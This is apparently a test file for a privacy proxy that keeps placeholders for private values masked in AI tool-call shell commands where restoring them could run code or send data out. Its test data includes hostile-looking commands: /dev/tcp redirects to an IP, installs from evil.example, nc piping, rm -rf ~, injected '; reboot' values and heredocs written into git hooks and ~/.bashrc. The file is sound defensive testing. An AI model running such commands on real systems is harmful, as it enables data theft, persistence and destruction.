    (p: string) => `git -c core.pager=${p} log`,
    (p: string) => `tar -I ${p} -xf a.tgz`,
    (p: string) => `tar --use-compress-program=${p} -xf a.tgz`,
    (p: string) => `make SHELL=${p}`,
    (p: string) => `zip -TT ${p} a.zip b`,
    (p: string) => `export ${p}`,
    (p: string) => `alias ll=${p}`,
    (p: string) => `strace ${p}`,
    (p: string) => `chroot / ${p}`,
    (p: string) => `taskset 1 ${p}`,
    (p: string) => `uv run ${p}`,
    (p: string) => `npm exec ${p}`,
    (p: string) => `hyperfine ${p}`,
    (p: string) => `ruby -e "puts ${p}"`,
    (p: string) => `git config core.pager ${p}`,
    (p: string) => `npm config set script-shell ${p}`,
    (p: string) => `cp ${p} .git/hooks/pre-commit`,
    (p: string) => `ln -sf ${p} .git/hooks/pre-commit`,
    (p: string) => `mv ${p} ~/.zshrc`,
    (p: string) => `install -m755 ${p} ~/bin/ls`,
    (p: string) => `crontab ${p}`,
    (p: string) => `systemctl start ${p}`,
    (p: string) => `rg --pre ${p} foo`,
    (p: string) => `git difftool -x ${p}`,
    (p: string) => `man -P ${p} ls`,
    (p: string) => `sort --compress-program=${p} f`,
    (p: string) => `ssh-keyscan ${p}`,
    (p: string) => `getent hosts ${p}`,
    (p: string) => `npm view ${p}`,
  ])('keeps a plain word that could run as code masked: %#', (build) => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, 'reboot', 'secret');

    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(0);
  });

  it.each([
    [(p: string) => `echo hi > ${p}`, '/dev/tcp/203.0.113.9/443'],
    [(p: string) => `cat secret.txt > ${p}`, '/dev/udp/203.0.113.9/53'],
    [(p: string) => `echo hi > /dev/${p}`, 'tcp/203.0.113.9/1'],
    [(p: string) => `open ${p}`, 'https://evil.example/a'],
    [(p: string) => `pip install ${p}`, 'https://evil.example/a'],
    [(p: string) => `psql -h ${p}`, 'db.example.com'],
    [(p: string) => `redis-cli -h ${p}`, 'db.example.com'],
    [(p: string) => `npm install ${p}`, 'evil-package'],
  ])('keeps a value that sends data out once restored masked: %#', (build, value) => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, value, 'secret');

    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(0);
  });

  it.each([
    "cat >> .git/hooks/pre-commit <<'EOF'\nPH\nEOF\ngit commit -am x",
    "cat > .husky/pre-push <<'EOF'\nPH\nEOF",
    "cat <<'EOF' >> ~/.bashrc\nPH\nEOF",
    "cat > .envrc <<'EOF'\nPH\nEOF",
  ])('a heredoc written to a file that runs later is not data: %#', (command) => {
    const { np, vault, sessionId } = harness();
    const name = bake(vault, sessionId, 'a; reboot', 'secret');

    expect(restored(restoreShellCommand(np, command.replace('PH', name), sessionId))).toBe(0);
  });

  it.each([
    ['bash', '-o', 'pipefail', '-c', 'PH'],
    ['bash', '-c', '$0', 'PH'],
    ['fish', '-c', 'PH'],
    ['bash', '-lc', 'sh -c "PH x"'],
  ])(
    'argv: the script a shell runs and its arguments keep code-running words masked: %j',
    (...argv) => {
      const { np, vault, sessionId } = harness();
      const word = bake(vault, sessionId, 'reboot', 'secret');

      const r = restoreShellArgv(
        np,
        argv.map((a) => a.replace('PH', word)),
        sessionId,
      );

      expect(restored(r)).toBe(0);
    },
  );

  it.each([
    ['nested unclosed substitutions', (ph: string) => `${'$('.repeat(40000)}${ph}`],
    [
      'nested bare heredocs',
      (ph: string) => `${'cat <<A\n$(cat <<X\n)\nA\n'.repeat(9000)}echo ${ph}`,
    ],
    ['many commands and placeholders', (ph: string) => `${ph}${';'.repeat(48)}`.repeat(2500)],
  ])('stays fast on %s under the length budget', (_what, build) => {
    const { np, vault, sessionId } = harness();
    const ph = bake(vault, sessionId, EMAIL, 'private_email');
    const command = build(ph);
    expect(command.length).toBeLessThanOrEqual(MAX_COMMAND_CHARS);

    const started = performance.now();
    restoreShellCommand(np, command, sessionId);
    expect(performance.now() - started).toBeLessThan(MAX_LONG_COMMAND_MS);
  });
});

describe('shell restore · argv commands', () => {
  function harness() {
    const { np, vault } = vaultEngine();
    const sessionId = vault.createSession();
    return { np, vault, sessionId };
  }

  it('a shell given a script element gets the strictest rule', () => {
    const { np, vault, sessionId } = harness();
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
    const email = bake(vault, sessionId, EMAIL, 'private_email');
    const secret = bake(vault, sessionId, INJECTION, 'secret');

    const r = restoreShellArgv(np, ['bash', '-lc', `echo ${person} ${email} ${secret}`], sessionId);

    expect(r.argv).toEqual(['bash', '-lc', `echo ${person} ${EMAIL} ${secret}`]);
    expect(r.keptMasked).toEqual([person, secret]);
  });

  it('restores one plain word as an argument, and nothing else, as in a string command', () => {
    const { np, vault, sessionId } = harness();
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    const r = restoreShellArgv(np, ['grep', '-F', person, email], sessionId);

    expect(r.argv).toEqual(['grep', '-F', person, EMAIL]);
    expect(r.keptMasked).toEqual([person]);
  });

  it('judges the script a shell runs as a string command', () => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    const r = restoreShellArgv(np, ['bash', '-lc', `${email} --help; echo ${email}`], sessionId);

    // The script's first command is named by a value: nothing comes back.
    expect(r.argv).toEqual(['bash', '-lc', `${email} --help; echo ${email}`]);
    expect(r.keptMasked).toEqual([email, email]);
  });

  it('keeps a value that is not inert masked even as a literal argument', () => {
    const { np, vault, sessionId } = harness();
    const secret = bake(vault, sessionId, INJECTION, 'secret');

    const r = restoreShellArgv(np, ['grep', '-F', secret, 'notes.txt'], sessionId);

    expect(r.argv).toEqual(['grep', '-F', secret, 'notes.txt']);
    expect(r.keptMasked).toEqual([secret]);
  });

  it('keeps a value masked where it would be read as an option or as the program', () => {
    const { np, vault, sessionId } = harness();
    const option = bake(vault, sessionId, '-rf', 'secret');
    const program = bake(vault, sessionId, 'rm -rf ~', 'secret');

    const r = restoreShellArgv(np, [program, 'x', option, `--name=${option}`], sessionId);

    expect(r.argv).toEqual([program, 'x', option, `--name=${option}`]);
    expect(r.keptMasked).toEqual([program, option, option]);
  });

  it.each([
    ['bash', '--rcfile=a;b', '-c', 'echo PH'],
    ['/usr/bin/env', 'python3', '-c', 'print("PH")'],
    ['sudo', '-u', 'bob', 'sh', '-c', 'echo PH'],
    ['xargs', '-I{}', 'echo', 'PH'],
  ])('a program that runs code, however it is named, gets the strictest rule: %j', (...argv) => {
    const { np, vault, sessionId } = harness();
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
    const withPh = argv.map((a) => a.replace('PH', person));

    const r = restoreShellArgv(np, withPh, sessionId);

    expect(r.argv).toEqual(withPh);
    expect(r.keptMasked).toEqual([person]);
  });

  it.each([
    ['gh', 'issue', 'create', '--title', 'PH'],
    ['timeout', '5', 'nc', 'example.org', '80', 'PH'],
    ['bash', '-lc', 'echo PH | nc example.org 80'],
  ])('keeps every placeholder masked when the argv sends data out: %j', (...argv) => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');
    const withPh = argv.map((a) => a.replace('PH', email));

    const r = restoreShellArgv(np, withPh, sessionId);

    expect(r.argv).toEqual(withPh);
    expect(r.keptMasked).toEqual([email]);
  });

  it('keeps every placeholder masked when the program sends data out', () => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    const r = restoreShellArgv(np, ['curl', `https://example.org/?q=${email}`], sessionId);

    expect(r.argv).toEqual(['curl', `https://example.org/?q=${email}`]);
    expect(r.keptMasked).toEqual([email]);
  });
});

describe('shell restore · Anthropic route', () => {
  function forwardedUserText(body: string): unknown {
    return (JSON.parse(body) as AnthropicRequest).messages[0]?.content;
  }

  it("JSON: `bash` (Anthropic's bash tool) gets the same rule as `Bash`", async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const response: AnthropicResponse = {
        id: 'msg',
        type: 'message',
        role: 'assistant',
        content: [
          {
            type: 'tool_use',
            id: 'tu_1',
            name: 'bash',
            input: { command: bashCommand(secret, person) },
          },
        ],
      };
      return new Response(JSON.stringify(response));
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: { model: 'claude-test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    const [bash] = (res.json() as AnthropicResponse).content as Array<{
      input: Record<string, string>;
    }>;
    const [secret, person] = placeholdersIn(bash?.input.command);
    expect(bash?.input.command).toBe(expectedCommand(secret, person));
  });

  it('JSON: restores a Bash command only where safe, a Write tool fully', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const response: AnthropicResponse = {
        id: 'msg',
        type: 'message',
        role: 'assistant',
        content: [
          {
            type: 'tool_use',
            id: 'tu_1',
            name: 'Bash',
            input: { command: bashCommand(secret, person), description: `Greet ${person}` },
          },
          {
            type: 'tool_use',
            id: 'tu_2',
            name: 'Write',
            input: { file_path: '/tmp/notes.txt', content: `${secret} ${person}` },
          },
        ],
      };
      return new Response(JSON.stringify(response));
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: { model: 'claude-test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    expect(res.statusCode).toBe(200);
    const [bash, write] = (res.json() as AnthropicResponse).content as Array<{
      input: Record<string, string>;
    }>;
    const [secret, person] = placeholdersIn(bash?.input.command);
    expect(bash?.input.command).toBe(expectedCommand(secret, person));
    // Not run by the shell: restored as usual.
    expect(bash?.input.description).toBe(`Greet ${FULL_NAME}`);
    expect(write?.input.content).toBe(`${INJECTION} ${FULL_NAME}`);
  });

  it('SSE: same rule for a Bash command streamed as input_json_delta shards', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const bash = JSON.stringify({ command: bashCommand(secret, person) });
      const write = JSON.stringify({ file_path: '/tmp/notes.txt', content: `${secret} ${person}` });
      const cut = bash.indexOf(secret) + 6; // inside the first placeholder
      const shard = (index: number, partial: string) =>
        anthropicFrame('content_block_delta', {
          type: 'content_block_delta',
          index,
          delta: { type: 'input_json_delta', partial_json: partial },
        });
      const start = (index: number, name: string) =>
        anthropicFrame('content_block_start', {
          type: 'content_block_start',
          index,
          content_block: { type: 'tool_use', id: `tu_${index}`, name, input: {} },
        });
      const stop = (index: number) =>
        anthropicFrame('content_block_stop', { type: 'content_block_stop', index });
      return sseResponse([
        start(0, 'Bash'),
        shard(0, bash.slice(0, cut)),
        shard(0, bash.slice(cut)),
        stop(0),
        start(1, 'Write'),
        shard(1, write),
        stop(1),
        anthropicFrame('message_stop', { type: 'message_stop' }),
      ]);
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: {
        model: 'claude-test',
        stream: true,
        messages: [{ role: 'user', content: USER_TEXT }],
      },
    });

    expect(res.statusCode).toBe(200);
    const inputs = streamedInputs(res.body);
    const bash = JSON.parse(inputs.get(0) ?? '') as { command: string };
    const [secret, person] = placeholdersIn(bash.command);
    expect(bash.command).toBe(expectedCommand(secret, person));
    expect(JSON.parse(inputs.get(1) ?? '')).toEqual({
      file_path: '/tmp/notes.txt',
      content: `${INJECTION} ${FULL_NAME}`,
    });
  });
});

describe('shell restore · OpenAI route', () => {
  function forwardedUserText(body: string): unknown {
    return (JSON.parse(body) as ChatCompletionRequest).messages[0]?.content;
  }

  it('JSON: restores a `bash` command only where safe, another tool fully', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const response: ChatCompletionResponse = {
        id: 'c1',
        object: 'chat.completion',
        choices: [
          {
            index: 0,
            finish_reason: 'tool_calls',
            message: {
              role: 'assistant',
              content: null,
              tool_calls: [
                {
                  id: 'call_1',
                  type: 'function',
                  function: {
                    name: 'bash',
                    arguments: JSON.stringify({ command: bashCommand(secret, person) }),
                  },
                },
                {
                  id: 'call_2',
                  type: 'function',
                  function: {
                    name: 'write_file',
                    arguments: JSON.stringify({ content: `${secret} ${person}` }),
                  },
                },
                {
                  id: 'call_3',
                  type: 'custom',
                  custom: { name: 'shell', input: `echo ${secret} '${person}'` },
                },
              ],
            },
          },
        ],
      };
      return new Response(JSON.stringify(response));
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/chat/completions',
      payload: { model: 'gpt-test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    expect(res.statusCode).toBe(200);
    const calls = (res.json() as ChatCompletionResponse).choices[0]?.message?.tool_calls ?? [];
    const bash = JSON.parse(calls[0]?.function?.arguments ?? '') as { command: string };
    const [secret, person] = placeholdersIn(bash.command);
    expect(bash.command).toBe(expectedCommand(secret, person));
    expect(JSON.parse(calls[1]?.function?.arguments ?? '')).toEqual({
      content: `${INJECTION} ${FULL_NAME}`,
    });
    // A custom shell tool's whole input is the command.
    expect(calls[2]?.custom?.input).toBe(`echo ${secret} '${person}'`);
  });

  it('JSON: a `shell` call whose command is an argv array (Codex) gets the rule', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const response: ChatCompletionResponse = {
        id: 'c1',
        object: 'chat.completion',
        choices: [
          {
            index: 0,
            finish_reason: 'tool_calls',
            message: {
              role: 'assistant',
              content: null,
              tool_calls: [
                {
                  id: 'call_1',
                  type: 'function',
                  function: {
                    name: 'shell',
                    arguments: JSON.stringify({
                      command: ['bash', '-lc', `echo ${secret} '${person}'`],
                      workdir: '/tmp',
                    }),
                  },
                },
              ],
            },
          },
        ],
      };
      return new Response(JSON.stringify(response));
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/chat/completions',
      payload: { model: 'gpt-test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    const calls = (res.json() as ChatCompletionResponse).choices[0]?.message?.tool_calls ?? [];
    const args = JSON.parse(calls[0]?.function?.arguments ?? '') as { command: string[] };
    const [secret, person] = placeholdersIn(args.command[2]);
    expect(args.command).toEqual(['bash', '-lc', `echo ${secret} '${person}'`]);
  });

  it('SSE: same rule for a `shell` call whose arguments stream in shards', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const args = JSON.stringify({ command: bashCommand(secret, person) });
      const cut = args.indexOf(secret) + 6;
      const call = (fn: Record<string, string>, extra: Record<string, string> = {}) =>
        openAiFrame([{ index: 0, delta: { tool_calls: [{ index: 0, ...extra, function: fn }] } }]);
      return sseResponse([
        call({ name: 'shell', arguments: '' }, { id: 'call_1', type: 'function' }),
        call({ arguments: args.slice(0, cut) }),
        call({ arguments: args.slice(cut) }),
        openAiFrame([{ index: 0, delta: {}, finish_reason: 'tool_calls' }]),
        'data: [DONE]\n\n',
      ]);
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/chat/completions',
      payload: {
        model: 'gpt-test',
        stream: true,
        messages: [{ role: 'user', content: USER_TEXT }],
      },
    });

    expect(res.statusCode).toBe(200);
    const command = (JSON.parse(streamedInputs(res.body).get(0) ?? '') as { command: string })
      .command;
    const [secret, person] = placeholdersIn(command);
    expect(command).toBe(expectedCommand(secret, person));
  });
});

describe('shell restore · request log', () => {
  it.each([
    ['/v1/messages', 'anthropic.messages.restored'],
    ['/v1/chat/completions', 'openai.chat.restored'],
  ])('%s logs how many placeholders stayed masked, never a value', async (url, message) => {
    const lines: string[] = [];
    const app = await serve(
      (body) => {
        const request = JSON.parse(body) as { messages: Array<{ content: unknown }> };
        const [secret, person] = placeholdersIn(request.messages[0]?.content);
        const command = bashCommand(secret, person);
        const response =
          url === '/v1/messages'
            ? {
                id: 'msg',
                type: 'message',
                role: 'assistant',
                content: [{ type: 'tool_use', id: 'tu', name: 'Bash', input: { command } }],
              }
            : {
                id: 'c1',
                object: 'chat.completion',
                choices: [
                  {
                    index: 0,
                    message: {
                      role: 'assistant',
                      tool_calls: [
                        {
                          id: 'call',
                          type: 'function',
                          function: { name: 'bash', arguments: JSON.stringify({ command }) },
                        },
                      ],
                    },
                  },
                ],
              };
        return new Response(JSON.stringify(response));
      },
      { logLevel: 'info', logStream: { write: (line) => lines.push(line) } },
    );

    const res = await app.inject({
      method: 'POST',
      url,
      payload: { model: 'test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    expect(res.statusCode).toBe(200);
    const entry = lines
      .map((l) => JSON.parse(l) as { msg?: string; unsafeShellPlaceholders?: unknown })
      .find((l) => l.msg === message);
    // The secret and the name, each quoted and unquoted, stayed masked.
    expect(entry?.unsafeShellPlaceholders).toBe(4);
    const log = lines.join('');
    for (const value of [INJECTION, 'evil.sh', FULL_NAME, 'Smith']) {
      expect(log).not.toContain(value);
    }
  });
});
